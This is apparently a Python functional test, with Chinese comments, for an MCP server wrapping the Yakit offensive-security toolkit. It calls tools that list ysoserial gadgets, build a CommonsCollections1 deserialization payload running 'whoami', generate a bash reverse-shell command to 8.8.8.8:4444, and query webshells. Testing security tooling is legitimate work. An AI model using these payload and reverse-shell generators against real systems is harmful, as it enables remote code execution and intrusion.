# -*- coding: utf-8 -*-
"""
yakit-mcp 全功能实战测试 —— 第 11 域: 攻防工具
"""
import sys, json
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "tests"))
from _common import ensure_engine, p

from yakit_mcp.server import (yakit_yso_generate, yakit_yso_gadgets,
                               yakit_reverse_shell, yakit_reverse_shell_programs,
                               yakit_webshell_query, yakit_webshell_ping,
                               yakit_reverse_server)

engine, _ = ensure_engine()
print(f"引擎: {engine.host}:{engine.port} v{engine.version()}")

print("\n########## 1. yakit_yso_gadgets YSO gadget 列表 ##########")
r = json.loads(yakit_yso_gadgets())
gs = r.get("gadgets") or []
print("ok:", r.get("ok"), "gadgets:", len(gs))
print("前 10:", gs[:10])

print("\n########## 2. yakit_yso_generate（CommonsCollections1 + win_cmd whoami）##########")
r = json.loads(yakit_yso_generate("CommonsCollections1", "win_cmd", json.dumps({"cmd": "whoami"})))
print("ok:", r.get("ok"), "size:", r.get("size"))
print("b64 前 60:", (r.get("payload_b64") or "")[:60])
print("reason:", str(r.get("reason", ""))[:200])

print("\n########## 3. yakit_reverse_shell_programs 程序列表 ##########")
r = json.loads(yakit_reverse_shell_programs())
print("ok:", r.get("ok"), "programs:", (r.get("programs") or [])[:5])
print("shells:", (r.get("shells") or [])[:8])

print("\n########## 4. yakit_reverse_shell 生成反弹命令 ##########")
r = json.loads(yakit_reverse_shell("8.8.8.8", 4444, system="linux", shell_type="bash"))
print("ok:", r.get("ok"))
print("result:", str(r.get("result") or r.get("reason") or "")[:200])

print("\n########## 5. yakit_reverse_server 反连信息 ##########")
p("reverse_server", yakit_reverse_server())

print("\n########## 6. yakit_webshell_query 查 WebShell ##########")
p("webshell_query", yakit_webshell_query())

print("\n########## 7. yakit_webshell_ping（无 shell 时记录）##########")
r = json.loads(yakit_webshell_query())
shells = r.get("webshells") or []
if shells:
    sid = shells[0].get("id")
    p("webshell_ping", yakit_webshell_ping(sid))
else:
    print("无 WebShell 记录可 ping（正常：本地未配置 shell）")

print("\n攻防工具域测试完成")